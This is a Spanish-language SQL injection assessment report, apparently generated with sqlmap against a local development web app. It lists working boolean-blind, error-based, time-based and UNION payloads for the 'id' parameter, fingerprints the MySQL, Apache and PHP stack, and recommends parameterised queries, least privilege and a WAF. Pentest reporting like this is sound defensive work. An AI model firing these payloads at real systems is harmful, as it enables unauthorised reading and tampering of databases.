# Informe de Análisis SQLi — web.dev.local:8083

Fecha (UTC): 2026-04-27T10:20:31Z
Objetivo: http://web.dev.local:8083

Resumen ejecutivo
-----------------
Se identificó una vulnerabilidad de inyección SQL (SQL Injection) en el parámetro GET "id" de la aplicación objetivo. La inyección fue explotable mediante técnicas boolean-based blind, error-based, time-based y UNION queries utilizando sqlmap automatizado.

Evidencia técnica
-----------------
- Formulario detectado por sqlmap:
  GET http://web.dev.local:8083?id=&Submit=Submit
- Parámetro vulnerable: id (GET)
- Tipos de inyección detectados por sqlmap:
  - boolean-based blind
    payload ejemplo: id=4153' OR NOT 6008=6008-- KHZI&Submit=Submit
  - error-based
    payload ejemplo: id=4153' OR (SELECT 9928 FROM(SELECT COUNT(*),CONCAT(0x7178717671,(SELECT (ELT(9928=9928,1))),0x717a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- aUPR&Submit=Submit
  - time-based blind
    payload ejemplo: id=4153' AND (SELECT 6369 FROM (SELECT(SLEEP(5)))lKPY)-- nHYh&Submit=Submit
  - UNION query (2 columnas)
    payload ejemplo: id=4153' UNION ALL SELECT CONCAT(0x7178717671,0x686a79514a4a4967666c6c4b7769736a77536b597869554e6e56704754587648705a65445a7a6e46,0x717a6b6271),NULL-- -&Submit=Submit

- Información del entorno obtenida por sqlmap:
  - Back-end DBMS: MySQL >= 5.0 (MariaDB fork)
  - Web server OS: Linux Debian
  - Web server: Apache 2.4.65
  - PHP: 8.1.33

Explotación
-----------
Se ejecutó sqlmap en modo automatizado y aceptó la explotación interactiva; sqlmap confirmó y usó las técnicas enumeradas para verificar la vulnerabilidad. Los resultados y el archivo CSV generado por sqlmap se encuentran en: /home/kali_rdp/.local/share/sqlmap/output/results-04272026_1220pm.csv

Riesgo y impacto
----------------
Un atacante explotando esta vulnerabilidad podría leer datos sensibles de la base de datos, realizar consultas arbitrarias, y potencialmente escalar a ejecución remota de comandos dependiendo de la configuración del sistema y permisos del usuario de la base de datos.

Recomendaciones
---------------
1. Validación y saneamiento: Usar consultas parametrizadas (prepared statements) en todas las consultas que usen entradas del usuario.
2. Principio de privilegio mínimo: Asegurar que el usuario de la base de datos tenga los mínimos permisos necesarios (evitar SELECT/INSERT/UPDATE/DELETE si no son requeridos).
3. WAF y filtrado: Considerar un WAF para bloquear patrones de inyección, y reglas de detección de anomalías.
4. Auditoría y pruebas: Realizar una revisión completa del código y pruebas de seguridad adicionales (pentesting manual) para identificar y mitigar otros vectores.

Conclusión
----------
La vulnerabilidad de inyección SQL en el parámetro "id" fue encontrada y confirmada mediante explotación automatizada con sqlmap. Se recomienda corregir la validación y uso de consultas parametrizadas con alta prioridad.

Informe generado automáticamente por: herramienta de análisis (sqlmap) y registro de resultados.
